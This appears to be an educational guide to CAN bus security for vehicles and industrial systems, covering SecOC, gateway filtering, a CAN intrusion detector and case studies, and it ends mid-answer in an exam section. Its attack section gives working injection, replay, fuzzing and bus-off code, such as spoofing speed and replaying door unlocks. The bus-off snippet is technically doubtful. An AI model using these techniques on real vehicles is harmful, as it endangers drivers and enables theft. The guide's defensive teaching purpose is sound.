====================================================================
CAN Bus Security for Automotive and Industrial Systems
====================================================================

:Author: Cybersecurity Expert
:Date: January 2026
:Version: 1.0
:Standards: ISO 11898, ISO 15765, AUTOSAR SecOC, SAE J1939, ISO 21434

.. contents:: Table of Contents
   :depth: 3

TL;DR - Quick Reference
=======================

**CAN (Controller Area Network) Security Essentials:**

+-----------------------+-------------------------------------------+
| **CAN Property**      | **Security Implication**                  |
+=======================+===========================================+
| **Broadcast**         | All nodes see all messages (no privacy)   |
+-----------------------+-------------------------------------------+
| **No authentication** | Any node can send any message             |
+-----------------------+-------------------------------------------+
| **Priority-based**    | High-priority attacker can DoS bus        |
+-----------------------+-------------------------------------------+
| **No encryption**     | All data in plaintext                     |
+-----------------------+-------------------------------------------+
| **Error handling**    | Attacker can force "bus-off" state        |
+-----------------------+-------------------------------------------+

**Native CAN Vulnerabilities:**

.. code-block:: text

    🚨 NATIVE CAN = NO SECURITY
    
    ❌ No authentication → Message spoofing
    ❌ No encryption → Eavesdropping
    ❌ No integrity → Data tampering
    ❌ Broadcast → No access control
    ❌ Priority arbitration → DoS attacks

**Defense Mechanisms:**

.. code-block:: text

    ✅ AUTOSAR SecOC → Message authentication (CMAC)
    ✅ CAN-FD → Higher bandwidth, better for crypto
    ✅ Gateway filtering → Isolate safety-critical buses
    ✅ Intrusion Detection (IDS) → Anomaly detection
    ✅ Secure boot → Prevent ECU malware

**Attack Vectors:**

1. **OBD-II port** → Physical access, diagnostic interface
2. **Telematics** → Remote access (cellular, Wi-Fi)
3. **Infotainment** → USB, Bluetooth, internet connectivity
4. **Aftermarket devices** → Dongles, insurance trackers
5. **Supply chain** → Compromised ECUs from vendor

**Typical CAN IDs (Automotive):**

+------------+------------------------+------------+
| CAN ID     | Function               | Priority   |
+============+========================+============+
| 0x100      | Engine RPM             | High       |
+------------+------------------------+------------+
| 0x161      | Vehicle speed          | High       |
+------------+------------------------+------------+
| 0x244      | Steering angle         | High       |
+------------+------------------------+------------+
| 0x2C0      | Door lock status       | Medium     |
+------------+------------------------+------------+
| 0x3C3      | Infotainment messages  | Low        |
+------------+------------------------+------------+

Introduction to CAN Bus
========================

The **Controller Area Network (CAN)** is a robust serial communication protocol
designed for real-time applications. Developed by Bosch in the 1980s for
automotive applications, it is now used in:

- **Automotive**: Engine control, brakes, airbags, infotainment
- **Industrial**: Factory automation, PLCs, robotics
- **Aerospace**: Avionics (CAN Aerospace, ARINC 825)
- **Medical**: Surgical robots, patient monitors

**Key CAN Standards:**

- **ISO 11898-1**: CAN data link layer
- **ISO 11898-2**: CAN physical layer (high-speed CAN, up to 1 Mbps)
- **ISO 11898-3**: Low-speed fault-tolerant CAN (up to 125 kbps)
- **ISO 15765-2**: Diagnostic communication (CAN-based UDS)
- **SAE J1939**: CAN protocol for heavy-duty vehicles (trucks, buses)

CAN Protocol Fundamentals
==========================

CAN Frame Structure
-------------------

A standard CAN 2.0A frame (11-bit identifier):

.. code-block:: text

    ┌─────────────────────────────────────────────────────────┐
    │ SOF │ ID (11-bit) │ RTR │ IDE │ r0 │ DLC │ Data (0-8) │
    │     │ Priority    │     │     │    │     │   bytes    │
    └─────────────────────────────────────────────────────────┘
    │ CRC (15-bit) │ ACK │ EOF │
    └──────────────┴─────┴─────┘

- **SOF** (Start of Frame): 1 bit (dominant)
- **Identifier (ID)**: 11 bits (standard) or 29 bits (extended)
- **RTR** (Remote Transmission Request): 1 bit
- **IDE** (Identifier Extension): 1 bit (0 = standard, 1 = extended)
- **DLC** (Data Length Code): 4 bits (0-8 bytes)
- **Data**: 0-8 bytes
- **CRC**: 15-bit cyclic redundancy check
- **ACK**: Acknowledgment slot
- **EOF** (End of Frame): 7 bits (recessive)

CAN Arbitration and Priority
-----------------------------

CAN uses **CSMA/CA** (Carrier Sense Multiple Access / Collision Avoidance):

1. All nodes monitor the bus before transmitting
2. If two nodes transmit simultaneously, arbitration occurs bitwise
3. **Lower ID number = higher priority** (dominant bit wins)
4. Losing node stops transmitting and retries later

**Example:**

.. code-block:: text

    Node A wants to send ID 0x100 (binary: 00100000000)
    Node B wants to send ID 0x200 (binary: 01000000000)
    
    Arbitration:
    Bit 0: Both send 0 (dominant) → tie
    Bit 1: A sends 0, B sends 1 → A wins (0 is dominant)
    
    Result: Node A transmits, Node B defers

**Security Implication:**

An attacker can **starve the bus** by continuously sending high-priority
messages (low CAN IDs), preventing legitimate nodes from transmitting.

CAN Physical Layer
------------------

CAN uses a differential pair (CAN_H and CAN_L):

- **Recessive bit** (logical 1): CAN_H ≈ CAN_L ≈ 2.5V
- **Dominant bit** (logical 0): CAN_H ≈ 3.5V, CAN_L ≈ 1.5V (1V difference)

**Bus topology:**

.. code-block:: text

    ECU1 ──┬── CAN_H ──┬── ECU2
           │           │
           └── CAN_L ──┴── ECU3
    
    Termination resistors (120Ω) at both ends

**Physical access points for attackers:**

- OBD-II port (directly connected to CAN bus)
- Spliced wires (physical tampering)
- Aftermarket devices (dongles, trackers)

CAN Security Vulnerabilities
=============================

1. No Authentication
--------------------

**Vulnerability:**

Any ECU (or attacker device) on the CAN bus can send any message with any
CAN ID. There is no mechanism to verify the sender's identity.

**Attack Scenario:**

An attacker connects to the OBD-II port and sends a message with CAN ID 0x244
(steering angle). The power steering ECU accepts the message and turns the
wheels, even though it came from an unauthorized source.

**Real-World Example:**

Charlie Miller and Chris Valasek (2015) demonstrated remote car hacking by
exploiting the Jeep Cherokee's infotainment system. Once they gained access
to the infotainment ECU (which was connected to the CAN bus), they sent
spoofed CAN messages to control steering, brakes, and transmission.

**Mitigation:**

- **AUTOSAR SecOC** (Secure Onboard Communication): Adds CMAC-based message
  authentication
- **Gateway filtering**: Gateway ECU allows only specific CAN IDs between buses

2. No Encryption
----------------

**Vulnerability:**

All CAN messages are transmitted in plaintext. Any device with physical access
to the bus can eavesdrop on all communications.

**Attack Scenario:**

An attacker installs a CAN sniffer (e.g., CANtact, Kvaser) on the OBD-II port
and logs all traffic. They observe:

- Vehicle speed (CAN ID 0x161)
- Engine RPM (CAN ID 0x100)
- Door lock commands (CAN ID 0x2C0)
- Diagnostic messages revealing vehicle VIN

**Mitigation:**

- **Physical security**: Limit access to OBD-II port (lockable cover)
- **Encrypted CAN (future)**: Not yet standardized, but research ongoing
- **SecOC confidentiality mode** (AUTOSAR): Experimental support for encryption

3. Broadcast Nature
-------------------

**Vulnerability:**

All nodes on the CAN bus receive all messages (broadcast). There is no concept
of unicast or access control.

**Security Implication:**

Even if one ECU is compromised (e.g., infotainment), the attacker can see all
safety-critical messages (engine, brakes, airbags).

**Mitigation:**

- **Network segmentation**: Separate CAN buses for different domains:
  
  - **Powertrain CAN**: Engine, transmission (safety-critical)
  - **Chassis CAN**: ABS, power steering, airbags (safety-critical)
  - **Infotainment CAN**: Radio, navigation (low criticality)
  - **Gateway ECU**: Connects buses, filters messages

4. No Integrity Protection
---------------------------

**Vulnerability:**

CAN has a 15-bit CRC for error detection (bit flips, electromagnetic
interference), but CRC does not provide cryptographic integrity. An attacker
can modify a message and recalculate the CRC.

**Attack Scenario:**

An attacker intercepts a CAN message for vehicle speed (60 mph) and modifies
it to show 0 mph. The attacker recalculates the CRC, and the ECU accepts the
modified message.

**Mitigation:**

- **SecOC**: Adds cryptographic MAC (CMAC-AES-128) for integrity protection

5. DoS via Bus Flooding
------------------------

**Vulnerability:**

An attacker can flood the CAN bus with high-priority messages, preventing
legitimate ECUs from transmitting (denial of service).

**Attack Scenario:**

An attacker continuously sends messages with CAN ID 0x000 (highest priority).
Legitimate ECUs with lower-priority IDs (e.g., 0x100, 0x200) lose arbitration
and cannot transmit.

**Impact:**

- Safety-critical ECUs cannot send warnings (e.g., airbag ready status)
- Diagnostic tools cannot communicate with ECUs

**Mitigation:**

- **Gateway rate limiting**: Limit message rate from untrusted sources
- **IDS detection**: Monitor bus load and message frequency

6. Error Handling Exploits
---------------------------

**Vulnerability:**

CAN nodes use error counters to detect faulty nodes. If a node's error counter
exceeds 255, it enters "bus-off" state and stops transmitting.

**Attack Scenario:**

An attacker repeatedly sends CAN messages with incorrect CRC, causing a target
ECU to increment its error counter. Once the counter reaches 256, the ECU
enters bus-off state and is effectively disabled.

**Real-World Example:**

This attack was demonstrated by researchers against automotive ECUs, forcing
critical control units offline.

**Mitigation:**

- **Error handling hardening**: Implement more robust error recovery
- **Watchdog timers**: Detect and restart ECUs in bus-off state
- **IDS**: Monitor error frames and alert on suspicious patterns

CAN Attack Tools and Techniques
================================

Hardware Tools
--------------

**1. OBD-II Adapters:**

- **ELM327**: Low-cost OBD-II to USB/Bluetooth adapter ($10-$50)
- **CANtact**: Open-source USB-to-CAN adapter ($60)
- **Kvaser Leaf Light**: Professional CAN interface ($300)

**2. Software-Defined Radio (SDR):**

- Intercept wireless CAN (rare, but used in some vehicles for convenience
  features)

**3. Custom Hardware:**

- Raspberry Pi + PiCAN2 shield
- Arduino + MCP2515 CAN controller

Software Tools
--------------

**1. SocketCAN (Linux):**

.. code-block:: bash

    # Load CAN kernel module
    sudo modprobe can
    sudo modprobe can-raw
    sudo modprobe vcan
    
    # Create virtual CAN interface (for testing)
    sudo ip link add dev vcan0 type vcan
    sudo ip link set up vcan0
    
    # Sniff CAN traffic
    candump vcan0
    
    # Send CAN message
    cansend vcan0 123#DEADBEEF

**2. CANalyze (Python):**

.. code-block:: python

    import can
    
    # Connect to CAN bus
    bus = can.interface.Bus(channel='can0', bustype='socketcan')
    
    # Sniff messages
    for msg in bus:
        print(msg)
    
    # Send message
    msg = can.Message(arbitration_id=0x123, data=[0xDE, 0xAD, 0xBE, 0xEF])
    bus.send(msg)

**3. ICSim (ICS Simulator):**

A training tool for simulating CAN attacks on a virtual vehicle.

.. code-block:: bash

    git clone https://github.com/zombieCraig/ICSim
    cd ICSim
    ./setup_vcan.sh
    ./icsim vcan0 &
    ./controls vcan0 &  # Control the virtual car
    
    # Attack: Replay door unlock message
    candump -l vcan0  # Capture unlock message
    canplayer -I candump-2024-01-14_000000.log  # Replay

**4. CANToolz:**

A framework for CAN security analysis (fuzzing, sniffing, replay attacks).

Common CAN Attacks
==================

Attack 1: Message Injection
----------------------------

**Description:**

Inject spoofed CAN messages to control vehicle functions.

**Example: Unlock all doors**

.. code-block:: bash

    # Observed door unlock message: ID 0x2C0, data 0x01
    cansend can0 2C0#01

**Example: Set fake vehicle speed**

.. code-block:: c

    // Send fake speed message (100 mph)
    void send_fake_speed(int can_socket) {
        struct can_frame frame;
        frame.can_id = 0x161;  // Speed message CAN ID
        frame.can_dlc = 2;     // 2 bytes
        frame.data[0] = 0x64;  // 100 mph (0x0064 = 100 decimal)
        frame.data[1] = 0x00;
        
        write(can_socket, &frame, sizeof(struct can_frame));
    }

**Impact:**

- False speedometer reading (driver unaware of actual speed)
- Trigger ABS or traction control based on false data

Attack 2: Replay Attack
-----------------------

**Description:**

Capture legitimate CAN messages and replay them later.

**Example: Capture and replay door unlock**

.. code-block:: python

    import can
    
    bus = can.interface.Bus(channel='can0', bustype='socketcan')
    
    # Step 1: Capture door unlock message
    print("Waiting for door unlock message...")
    for msg in bus:
        if msg.arbitration_id == 0x2C0 and msg.data[0] == 0x01:
            unlock_msg = msg
            print(f"Captured: {msg}")
            break
    
    # Step 2: Replay the message later (after car is locked)
    input("Press Enter to replay unlock message...")
    bus.send(unlock_msg)
    print("Unlock message replayed!")

**Mitigation:**

- **SecOC with freshness value** (counter or timestamp)
- Each message includes a counter that increments, preventing replay

Attack 3: Fuzzing
-----------------

**Description:**

Send random or mutated CAN messages to find vulnerabilities in ECUs.

**Python Fuzzer:**

.. code-block:: python

    import can
    import random
    
    bus = can.interface.Bus(channel='can0', bustype='socketcan')
    
    # Fuzz CAN IDs from 0x000 to 0x7FF
    for can_id in range(0x000, 0x800):
        # Random data (0-8 bytes)
        data_length = random.randint(0, 8)
        data = [random.randint(0, 255) for _ in range(data_length)]
        
        msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
        bus.send(msg)
        print(f"Sent: ID=0x{can_id:03X}, Data={data}")

**Goal:**

- Trigger crashes or unexpected behavior in ECUs
- Find undocumented diagnostic commands

**Real-World Example:**

Researchers fuzzing automotive ECUs discovered that sending certain CAN
messages could disable airbags or cause engine stalls.

Attack 4: Bus-Off Attack
------------------------

**Description:**

Force an ECU into "bus-off" state by causing repeated transmission errors.

**Attack Code:**

.. code-block:: c

    // Send messages with intentionally incorrect CRC
    void bus_off_attack(int can_socket, uint32_t target_can_id) {
        struct can_frame frame;
        frame.can_id = target_can_id;
        frame.can_dlc = 8;
        memset(frame.data, 0xFF, 8);  // Fill with 0xFF
        
        // Disable CRC (if using raw CAN interface)
        // Repeatedly send with errors to increment target ECU's error counter
        for (int i = 0; i < 1000; i++) {
            write(can_socket, &frame, sizeof(struct can_frame));
            usleep(1000);  // 1ms delay
        }
    }

**Impact:**

- Target ECU disabled (e.g., ABS, airbag controller)
- Safety systems unavailable

**Mitigation:**

- **Monitor error counters** and restart ECUs automatically
- **IDS detection** of repeated error frames

Attack 5: Gateway Bypass
------------------------

**Description:**

If a vehicle has multiple CAN buses (e.g., infotainment CAN and powertrain
CAN) separated by a gateway, attackers try to bypass gateway filtering.

**Scenario:**

1. Attacker compromises infotainment ECU (low security)
2. Gateway is supposed to filter messages from infotainment to powertrain CAN
3. Attacker finds a vulnerability in gateway firmware
4. Attacker sends diagnostic message (CAN ID 0x7DF) that gateway forwards
5. Attacker gains access to powertrain CAN and controls engine

**Real-World Example:**

The 2015 Jeep Cherokee hack exploited a gateway vulnerability. The attackers
gained access via the infotainment system and then used a gateway exploit to
send commands to the powertrain CAN bus.

**Mitigation:**

- **Secure gateway firmware** (code signing, secure boot)
- **Allow-listing** of CAN IDs (gateway only forwards specific messages)
- **Rate limiting** to prevent flooding

AUTOSAR SecOC (Secure Onboard Communication)
============================================

SecOC Overview
--------------

**AUTOSAR SecOC** is a standardized mechanism for securing CAN (and other
automotive bus) communications. It provides:

- **Authentication**: Verify the sender of a message
- **Integrity**: Detect tampering
- **Freshness**: Prevent replay attacks

SecOC does **not** provide confidentiality (encryption) by default.

SecOC Message Format
--------------------

SecOC adds authentication data to CAN messages:

.. code-block:: text

    Original CAN message:
    ┌───────────────────────────────────┐
    │ ID │ DLC │ Data (0-8 bytes)       │
    └───────────────────────────────────┘
    
    SecOC-protected message:
    ┌─────────────────────────────────────────────────────────┐
    │ ID │ DLC │ Data │ Freshness │ MAC (truncated CMAC)     │
    └─────────────────────────────────────────────────────────┘

- **Freshness Value**: Counter or timestamp (prevents replay)
- **MAC (Message Authentication Code)**: CMAC-AES-128 (truncated to 24-64 bits)

SecOC CMAC Generation
---------------------

.. code-block:: text

    Input to CMAC:
    - CAN ID
    - Data payload
    - Freshness value (counter)
    
    CMAC = CMAC-AES-128(Key, CAN_ID || Data || Freshness)
    
    Truncated MAC = First 24-64 bits of CMAC

**Key Management:**

- Each ECU has a shared symmetric key (pre-provisioned)
- Keys stored in Hardware Security Module (HSM) or secure flash

C Code: SecOC CMAC Calculation
-------------------------------

.. code-block:: c

    #include <openssl/cmac.h>
    #include <stdint.h>
    #include <string.h>
    
    // CMAC-AES-128 for SecOC message authentication
    void secoc_calculate_mac(
        const uint8_t *key,          // 128-bit AES key
        uint32_t can_id,
        const uint8_t *data,
        size_t data_len,
        uint32_t freshness_value,
        uint8_t *mac_out,            // Output: 24-bit MAC (3 bytes)
        size_t mac_len
    ) {
        CMAC_CTX *ctx = CMAC_CTX_new();
        
        // Initialize CMAC with AES-128
        CMAC_Init(ctx, key, 16, EVP_aes_128_cbc(), NULL);
        
        // Update with CAN ID (big-endian)
        uint32_t can_id_be = htonl(can_id);
        CMAC_Update(ctx, (uint8_t*)&can_id_be, sizeof(can_id_be));
        
        // Update with data payload
        CMAC_Update(ctx, data, data_len);
        
        // Update with freshness value (big-endian)
        uint32_t freshness_be = htonl(freshness_value);
        CMAC_Update(ctx, (uint8_t*)&freshness_be, sizeof(freshness_be));
        
        // Finalize CMAC (128-bit output)
        uint8_t full_mac[16];
        size_t full_mac_len = 16;
        CMAC_Final(ctx, full_mac, &full_mac_len);
        
        // Truncate to first 'mac_len' bytes (typically 3 bytes = 24 bits)
        memcpy(mac_out, full_mac, mac_len);
        
        CMAC_CTX_free(ctx);
    }
    
    // Example: Verify SecOC message
    int secoc_verify_message(
        const uint8_t *key,
        uint32_t can_id,
        const uint8_t *data,
        size_t data_len,
        uint32_t freshness_value,
        const uint8_t *received_mac,
        size_t mac_len
    ) {
        uint8_t calculated_mac[16];
        secoc_calculate_mac(key, can_id, data, data_len, freshness_value, 
                           calculated_mac, mac_len);
        
        // Compare truncated MACs
        if (memcmp(calculated_mac, received_mac, mac_len) == 0) {
            return 1;  // Verification success
        } else {
            return 0;  // Verification failed (tampered or wrong key)
        }
    }
    
    // Example usage
    int main() {
        // Pre-shared key (128-bit AES key, provisioned in HSM)
        uint8_t key[16] = {
            0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
            0xab, 0xf7, 0x97, 0x75, 0x46, 0x67, 0x09, 0x34
        };
        
        uint32_t can_id = 0x100;  // Engine RPM message
        uint8_t data[] = {0x12, 0x34, 0x56, 0x78};
        size_t data_len = sizeof(data);
        uint32_t freshness = 12345;  // Counter value
        
        // Calculate MAC
        uint8_t mac[3];  // 24-bit MAC
        secoc_calculate_mac(key, can_id, data, data_len, freshness, mac, 3);
        
        printf("Calculated MAC: %02X %02X %02X\n", mac[0], mac[1], mac[2]);
        
        // Verify message (receiver side)
        int valid = secoc_verify_message(key, can_id, data, data_len, 
                                        freshness, mac, 3);
        printf("Message verification: %s\n", valid ? "PASS" : "FAIL");
        
        return 0;
    }

SecOC Freshness Value
---------------------

The freshness value prevents replay attacks. Two approaches:

**1. Counter-based:**

- Each ECU maintains a message counter
- Counter increments with each message
- Receiver checks: `counter_received > counter_last`

**2. Timestamp-based:**

- ECU includes a timestamp
- Receiver checks: `timestamp_received > timestamp_last + tolerance`

**Challenge:**

CAN has limited bandwidth. Freshness value must be short (e.g., 8-16 bits).

**Solution:**

- Use a short counter (8-16 bits) that wraps around
- Receiver maintains full counter state and detects wrap-around

SecOC Limitations
-----------------

- **Performance overhead**: CMAC calculation takes CPU time (~10 µs per message)
- **Bandwidth**: SecOC adds 3-8 bytes per message (significant for CAN's 8-byte limit)
- **Key management**: Requires secure key provisioning and storage
- **No confidentiality**: Data still transmitted in plaintext

CAN-FD (Flexible Data-Rate)
============================

**CAN-FD** is an extension of CAN that provides:

- **Higher data rate**: Up to 8 Mbps (vs. 1 Mbps for classical CAN)
- **Larger payloads**: Up to 64 bytes per frame (vs. 8 bytes for classical CAN)
- **Backward compatible**: CAN-FD nodes can coexist with classical CAN nodes

CAN-FD Frame Format
-------------------

.. code-block:: text

    ┌────────────────────────────────────────────────────────┐
    │ SOF │ ID │ FDF │ BRS │ ESI │ DLC │ Data (up to 64 B)  │
    └────────────────────────────────────────────────────────┘
    │ CRC │ ACK │ EOF │
    └─────┴─────┴─────┘

- **FDF** (FD Format): 1 bit (indicates CAN-FD frame)
- **BRS** (Bit Rate Switch): 1 bit (switches to higher data rate after arbitration)
- **ESI** (Error State Indicator): 1 bit

Security Benefits of CAN-FD
---------------------------

1. **More space for SecOC**: 64-byte payload allows for longer MACs and freshness values
2. **Higher bandwidth**: More capacity for encryption (if standardized in future)
3. **Better IDS performance**: IDS can process more data without bus congestion

**However:**

CAN-FD does **not** inherently fix security issues (still no native authentication
or encryption).

Automotive Gateway and Network Segmentation
============================================

Gateway ECU Architecture
-------------------------

A **gateway ECU** connects multiple CAN buses and filters messages:

.. code-block:: text

    [Infotainment CAN] ←→ [Gateway ECU] ←→ [Powertrain CAN]
                                ↕
                         [Chassis CAN]

**Gateway Responsibilities:**

1. **Message routing**: Forward specific CAN IDs between buses
2. **Protocol translation**: Convert between CAN, CAN-FD, Ethernet
3. **Security filtering**: Block unauthorized messages from low-security buses
4. **Rate limiting**: Prevent flooding attacks

Gateway Filtering Rules (Example)
----------------------------------

.. code-block:: text

    Rule 1: Infotainment → Powertrain
      Allow: None (no messages forwarded)
      
    Rule 2: Powertrain → Infotainment
      Allow: CAN ID 0x100 (Engine RPM) - read-only for display
      Allow: CAN ID 0x161 (Vehicle speed) - read-only for navigation
      
    Rule 3: Powertrain ↔ Chassis
      Allow: Bidirectional for safety-critical messages (ABS, airbag)

**Security Benefit:**

Even if infotainment ECU is compromised, attacker cannot send messages to
powertrain CAN (gateway blocks all messages from infotainment).

C Code: Gateway Message Filtering
----------------------------------

.. code-block:: c

    #include <linux/can.h>
    #include <linux/can/raw.h>
    #include <sys/socket.h>
    #include <sys/ioctl.h>
    #include <net/if.h>
    #include <unistd.h>
    #include <string.h>
    
    // Gateway: Forward whitelisted messages only
    typedef struct {
        uint32_t can_id;
        int from_bus;  // 0=infotainment, 1=powertrain, 2=chassis
        int to_bus;
    } gateway_rule_t;
    
    gateway_rule_t whitelist[] = {
        {0x100, 1, 0},  // Engine RPM: powertrain → infotainment (read-only)
        {0x161, 1, 0},  // Speed: powertrain → infotainment (read-only)
        {0x200, 1, 2},  // ABS: powertrain ↔ chassis (bidirectional)
        {0x200, 2, 1},
    };
    
    int is_allowed(uint32_t can_id, int from_bus, int to_bus) {
        for (int i = 0; i < sizeof(whitelist)/sizeof(gateway_rule_t); i++) {
            if (whitelist[i].can_id == can_id &&
                whitelist[i].from_bus == from_bus &&
                whitelist[i].to_bus == to_bus) {
                return 1;  // Allowed
            }
        }
        return 0;  // Blocked
    }
    
    void gateway_loop(int infotainment_sock, int powertrain_sock, int chassis_sock) {
        struct can_frame frame;
        fd_set read_fds;
        int max_fd = (infotainment_sock > powertrain_sock ? 
                      infotainment_sock : powertrain_sock);
        max_fd = (max_fd > chassis_sock ? max_fd : chassis_sock);
        
        while (1) {
            // Monitor all CAN buses
            FD_ZERO(&read_fds);
            FD_SET(infotainment_sock, &read_fds);
            FD_SET(powertrain_sock, &read_fds);
            FD_SET(chassis_sock, &read_fds);
            
            select(max_fd + 1, &read_fds, NULL, NULL, NULL);
            
            // Check infotainment CAN
            if (FD_ISSET(infotainment_sock, &read_fds)) {
                read(infotainment_sock, &frame, sizeof(struct can_frame));
                
                // Try to forward to powertrain
                if (is_allowed(frame.can_id, 0, 1)) {
                    write(powertrain_sock, &frame, sizeof(struct can_frame));
                } else {
                    printf("[GATEWAY] Blocked: Infotainment → Powertrain, "
                           "ID=0x%03X\n", frame.can_id);
                }
            }
            
            // Check powertrain CAN
            if (FD_ISSET(powertrain_sock, &read_fds)) {
                read(powertrain_sock, &frame, sizeof(struct can_frame));
                
                // Forward to infotainment (if allowed)
                if (is_allowed(frame.can_id, 1, 0)) {
                    write(infotainment_sock, &frame, sizeof(struct can_frame));
                }
                
                // Forward to chassis (if allowed)
                if (is_allowed(frame.can_id, 1, 2)) {
                    write(chassis_sock, &frame, sizeof(struct can_frame));
                }
            }
            
            // Check chassis CAN
            if (FD_ISSET(chassis_sock, &read_fds)) {
                read(chassis_sock, &frame, sizeof(struct can_frame));
                
                // Forward to powertrain (if allowed)
                if (is_allowed(frame.can_id, 2, 1)) {
                    write(powertrain_sock, &frame, sizeof(struct can_frame));
                }
            }
        }
    }

Intrusion Detection Systems (IDS) for CAN
==========================================

CAN IDS Approaches
------------------

**1. Signature-Based IDS:**

- Detect known attack patterns (e.g., specific CAN IDs or sequences)
- Example: Alert on CAN ID 0x000 (common for bus flooding)

**2. Anomaly-Based IDS:**

- Learn normal CAN traffic patterns
- Detect deviations (e.g., unexpected CAN ID, abnormal frequency)

**3. Specification-Based IDS:**

- Enforce rules (e.g., "CAN ID 0x100 should appear every 10ms")
- Alert on violations

Python CAN IDS Implementation
------------------------------

.. code-block:: python

    #!/usr/bin/env python3
    """
    Simple anomaly-based CAN IDS
    """
    
    import can
    import time
    from collections import defaultdict
    
    class CANIDS:
        def __init__(self, threshold_multiplier=3.0):
            self.message_counts = defaultdict(int)
            self.last_seen = {}
            self.normal_intervals = {}  # Expected time between messages
            self.threshold_multiplier = threshold_multiplier
        
        def learn_normal_traffic(self, bus, duration=60):
            """Learn normal CAN traffic patterns"""
            print(f"Learning normal traffic for {duration} seconds...")
            intervals = defaultdict(list)
            
            start_time = time.time()
            while time.time() - start_time < duration:
                msg = bus.recv(timeout=1.0)
                if msg is None:
                    continue
                
                can_id = msg.arbitration_id
                current_time = time.time()
                
                if can_id in self.last_seen:
                    interval = current_time - self.last_seen[can_id]
                    intervals[can_id].append(interval)
                
                self.last_seen[can_id] = current_time
            
            # Calculate average intervals
            for can_id, interval_list in intervals.items():
                avg_interval = sum(interval_list) / len(interval_list)
                self.normal_intervals[can_id] = avg_interval
                print(f"  CAN ID 0x{can_id:03X}: avg interval = {avg_interval:.3f}s")
            
            print("Learning complete.")
        
        def detect_anomalies(self, bus):
            """Monitor CAN bus and detect anomalies"""
            print("Starting anomaly detection...")
            
            while True:
                msg = bus.recv(timeout=1.0)
                if msg is None:
                    continue
                
                can_id = msg.arbitration_id
                current_time = time.time()
                
                # Check for new (previously unseen) CAN ID
                if can_id not in self.normal_intervals:
                    print(f"[ALERT] New CAN ID detected: 0x{can_id:03X}")
                    continue
                
                # Check message frequency
                if can_id in self.last_seen:
                    interval = current_time - self.last_seen[can_id]
                    expected_interval = self.normal_intervals[can_id]
                    
                    # Alert if too frequent (potential flooding)
                    if interval < expected_interval / self.threshold_multiplier:
                        print(f"[ALERT] CAN ID 0x{can_id:03X} too frequent: "
                              f"{interval:.3f}s (expected {expected_interval:.3f}s)")
                    
                    # Alert if too slow (potential ECU failure)
                    if interval > expected_interval * self.threshold_multiplier:
                        print(f"[ALERT] CAN ID 0x{can_id:03X} too slow: "
                              f"{interval:.3f}s (expected {expected_interval:.3f}s)")
                
                self.last_seen[can_id] = current_time
    
    # Example usage
    if __name__ == "__main__":
        bus = can.interface.Bus(channel='can0', bustype='socketcan')
        
        ids = CANIDS(threshold_multiplier=2.0)
        
        # Phase 1: Learn normal traffic (e.g., 60 seconds of normal driving)
        ids.learn_normal_traffic(bus, duration=60)
        
        # Phase 2: Monitor and detect anomalies
        ids.detect_anomalies(bus)

IDS Deployment in Vehicle Architecture
---------------------------------------

.. code-block:: text

    [Gateway ECU with IDS]
           │
           ├─→ [Infotainment CAN]
           ├─→ [Powertrain CAN]
           └─→ [Chassis CAN]
           
    IDS monitors all traffic passing through gateway
    Alerts logged to secure storage (tamper-proof)

Defense-in-Depth for CAN Security
==================================

**Layer 1: Physical Security**

- Lock OBD-II port (physical cover with key)
- Tamper-evident seals on ECU enclosures
- Secure supply chain (verify ECU authenticity)

**Layer 2: Network Segmentation**

- Separate CAN buses for different functions (powertrain, infotainment, chassis)
- Gateway ECU with strict filtering rules

**Layer 3: Secure Boot and Code Signing**

- ECUs verify firmware integrity before boot
- Only signed firmware accepted

**Layer 4: SecOC Message Authentication**

- CMAC-based authentication for safety-critical messages
- Freshness values prevent replay attacks

**Layer 5: Intrusion Detection**

- CAN IDS monitors bus for anomalies
- Alerts sent to Telematics Unit (cellular) or logged locally

**Layer 6: Incident Response**

- OTA (Over-The-Air) updates to patch vulnerabilities
- Remote ECU isolation (gateway can disconnect compromised ECU)

Real-World Case Studies
========================

Case Study 1: Jeep Cherokee Hack (2015)
----------------------------------------

**Attack Vector:**

- Exploited vulnerability in Uconnect infotainment system
- Uconnect had cellular connectivity (Sprint network)
- Researchers gained remote shell access to infotainment Linux system
- Infotainment ECU connected to CAN bus (no gateway isolation)

**Attack Steps:**

1. Remote code execution on infotainment system
2. Send CAN messages from infotainment ECU to powertrain CAN
3. Control steering, brakes, transmission

**Result:**

- FCA (Fiat Chrysler) recalled 1.4 million vehicles
- OTA software update deployed to patch vulnerability

**Lessons Learned:**

- Network segmentation critical (infotainment should not access powertrain CAN)
- Gateway filtering must be enforced
- OTA update capability essential for incident response

Case Study 2: Tesla Model S (2017)
-----------------------------------

**Attack Vector:**

- Researchers exploited web browser vulnerability in Tesla's infotainment
- Gained root access to infotainment system
- Attempted to access CAN bus

**Defense:**

- Tesla's gateway ECU blocked messages from infotainment to powertrain CAN
- Researchers could not control vehicle functions

**Result:**

- Tesla patched web browser vulnerability via OTA update
- Demonstrated importance of gateway security

Case Study 3: Aftermarket OBD-II Devices
-----------------------------------------

**Scenario:**

- Insurance companies provide OBD-II dongles for usage-based insurance
- Dongles read CAN data (speed, RPM, braking)
- Some dongles have cellular or Bluetooth connectivity

**Security Risks:**

- Dongle firmware vulnerabilities (remote code execution)
- Attacker could send malicious CAN messages via compromised dongle
- Dongles often do not implement SecOC

**Mitigation:**

- Gateway should filter messages from OBD-II port
- OBD-II port should be read-only for diagnostics (not write access to
  safety-critical messages)

Exam Questions
==============

Question 1: CAN Arbitration and DoS (Difficulty: Medium)
---------------------------------------------------------

You observe the following CAN IDs on a vehicle's bus:

- 0x100: Engine RPM (sent every 10ms)
- 0x161: Vehicle speed (sent every 20ms)
- 0x244: Steering angle (sent every 10ms)

An attacker connects a malicious device that sends CAN ID 0x050 every 1ms.

**a)** Which legitimate messages will be affected, and how?

**b)** Propose two defenses against this attack.

**Answer:**

**a) Impact:**

CAN arbitration is based on **priority** (lower CAN ID = higher priority).

- **0x050** (attacker): Highest priority (lower ID)
- **0x100** (Engine RPM): Medium priority
- **0x161** (Speed): Low priority
- **0x244** (Steering): Lowest priority

The attacker's high-priority messages (0x050) will **win arbitration** against
all legitimate messages. This causes:

- **Bus flooding**: Attacker sends 1000 messages/second (1ms interval)
- **Starvation**: Legitimate ECUs lose arbitration, cannot transmit
- **Impact on safety**: Steering angle (0x244) cannot be transmitted, so
  Electronic Power Steering (EPS) may not function correctly

**b) Defenses:**

**Defense 1: Gateway Rate Limiting**

